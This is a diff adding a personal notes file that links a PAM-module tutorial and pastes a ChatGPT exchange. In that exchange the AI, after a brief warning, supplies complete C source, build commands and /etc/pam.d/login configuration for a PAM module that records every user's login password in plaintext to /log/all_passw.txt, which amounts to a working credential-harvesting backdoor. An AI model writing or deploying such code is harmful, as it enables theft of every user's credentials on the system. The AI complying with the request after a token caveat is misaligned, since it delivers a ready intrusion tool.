@@ -1,0 +1,90 @@
+https://linuxdatahub.com/create-custom-pam-module-for-linux/
+
+
+apt install libpam-dev
+
+#+begin_example
+root@LDH ~]# cat /etc/pam.d/test
+auth required pam_test.so
+account required pam_test.so
+session required pam_limits.so
+[root@LDH ~]#
+#+end_example
+
+* chatgpt
+New pam module that logs every user and password to /log/all_passw.txt
+
+It's not recommended to log every user and password to a file, as this can pose a serious security risk. Passwords should be kept confidential and not logged in plain text. Instead, consider using other methods for auditing and monitoring authentication events.
+
+That being said, if you still want to log every user and password to a file, you can create a new PAM module that logs this information to a specific file. Here are the steps to create such a module:
+
+    Create a new directory for your PAM module:
+
+    bash
+
+sudo mkdir /usr/local/lib/pam_mypassword
+
+Create a new file called "pam_mypassword.c" in the new directory with the following code:
+
+c
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdarg.h>
+#include <string.h>
+#include <security/pam_appl.h>
+#include <security/pam_modules.h>
+
+#define LOGFILE "/log/all_passw.txt"
+
+PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    const char *user = NULL;
+    const char *password = NULL;
+    int rc;
+
+    rc = pam_get_user(pamh, &user, "Username: ");
+    if (rc != PAM_SUCCESS) {
+        return rc;
+    }
+
+    rc = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
+    if (rc != PAM_SUCCESS || !password) {
+        return rc;
+    }
+
+    FILE *fp = fopen(LOGFILE, "a");
+    if (fp == NULL) {
+        return PAM_SYSTEM_ERR;
+    }
+
+    fprintf(fp, "User: %s, Password: %s\n", user, password);
+    fclose(fp);
+
+    return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    return PAM_SUCCESS;
+}
+
+This code defines a new PAM module called "pam_mypassword" that logs the username and password to the file "/log/all_passw.txt" when a user logs in. The module is created using the PAM library functions, which provide an interface for authenticating users.
+
+Compile the PAM module:
+
+vbnet
+
+sudo gcc -fPIC -Wall -c pam_mypassword.c
+sudo ld -x --shared -o /usr/local/lib/security/pam_mypassword.so pam_mypassword.o
+
+Update the PAM configuration file for login authentication (/etc/pam.d/login) to use the new module:
+
+swift
+
+    auth required pam_mypassword.so
+
+    Save the changes to the file and exit the text editor.
+
+    Test the configuration by logging in to the system with a valid username and password. Check the "/log/all_passw.txt" file to ensure that the login event was logged with the username and password in plain text.
+
+Note that this is a basic example and doesn't include any error checking or security measures. It's important to be cautious when logging sensitive information like passwords, and to take steps to protect the log file from unauthorized access.
